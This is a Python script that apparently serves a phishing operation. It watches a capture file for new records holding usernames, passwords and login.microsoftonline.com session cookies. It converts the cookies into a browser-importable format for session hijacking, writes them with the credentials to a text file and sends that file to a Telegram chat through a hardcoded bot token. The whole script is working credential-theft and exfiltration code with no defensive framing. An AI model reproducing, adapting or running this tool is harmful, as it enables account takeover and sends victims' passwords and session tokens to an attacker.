import time
import os
import requests
import json

def find_last_json(file_path):
    # Find the last JSON object in the file
    with open(file_path, 'r') as file:
        lines = file.readlines()
        last_json_start_idx = -1
        for i in range(len(lines) - 1, -1, -1):
            if lines[i].startswith('{"id"'):
                last_json_start_idx = i
                break
        if last_json_start_idx != -1:
            last_json = ''.join(lines[last_json_start_idx:])
            return last_json
        else:
            return None

def convert_codeA_to_codeB(codeA):
    # Convert codeA JSON format to codeB format
    tokens = codeA.get('tokens', {})
    login_tokens = tokens.get('.login.microsoftonline.com', {})

    codeB = []
    for name, cookie in login_tokens.items():
        codeB.append({
            'path': cookie.get('Path', ''),
            'domain': '.login.microsoftonline.com',
            'expirationDate': 1755092790,  # Assuming a fixed expiration date
            'value': cookie.get('Value', ''),
            'name': name,
            'httpOnly': cookie.get('HttpOnly', False)
        })

    return codeB

def save_info_to_file(username, password, session, converted_json_str, file_path):
    # Save username, password, session, and converted JSON to info.txt
    with open(file_path, 'w') as file:
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Session: {session}\n\n")
        file.write("INFO.TXT\n\n")
        file.write("Converted JSON:\n")
        file.write(converted_json_str)

def send_telegram_message(file_path, bot_tokens, chat_ids):
    # Send the info.txt file to Telegram
    for bot_token, chat_id in zip(bot_tokens, chat_ids):
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        files = {'document': open(file_path, 'rb')}
        data = {'chat_id': chat_id}
        try:
            response = requests.post(url, files=files, data=data)
            if response.status_code == 200:
                print(f"Info file sent successfully to chat ID {chat_id} using bot token {bot_token}")
            else:
                print(f"Failed to send info file with status code {response.status_code} for chat ID {chat_id} using bot token {bot_token}")
        except requests.exceptions.RequestException as e:
            print(f"Failed to send info file with error {e} for chat ID {chat_id} using bot token {bot_token}")

def main():
    file_path = 'data.db'
    last_modification_time = 0
    bot_tokens = ["7484126813:AAFHaA_RWLYQthnRPWs9wRnUuLTjWJiUaBc", ""]  # Add more bot tokens here
    chat_ids = ["5626711501", ""]  # Add more chat IDs here
    
    while True:
        current_modification_time = os.path.getmtime(file_path)
        if current_modification_time != last_modification_time:
            last_modification_time = current_modification_time
            last_json = find_last_json(file_path)
            if last_json:
                # Convert the last JSON object to the desired format
                last_json = json.loads(last_json)
                
                # Extract username, password, and session from the JSON
                username = last_json.get('username', 'N/A')
                password = last_json.get('password', 'N/A')
                session = last_json.get('session', 'N/A')
                
                # Convert codeA to codeB
                converted_json = convert_codeA_to_codeB(last_json)
                converted_json_str = json.dumps(converted_json, indent=4)
                print("Converted JSON object:", converted_json_str)
                
                # Save the extracted information and converted JSON to info.txt
                info_file_path = 'info.txt'
                save_info_to_file(username, password, session, converted_json_str, info_file_path)
                
                # Send the info.txt file to Telegram
                send_telegram_message(info_file_path, bot_tokens, chat_ids)
            else:
                print("No JSON object found")
        time.sleep(5)

if __name__ == "__main__":
    main()
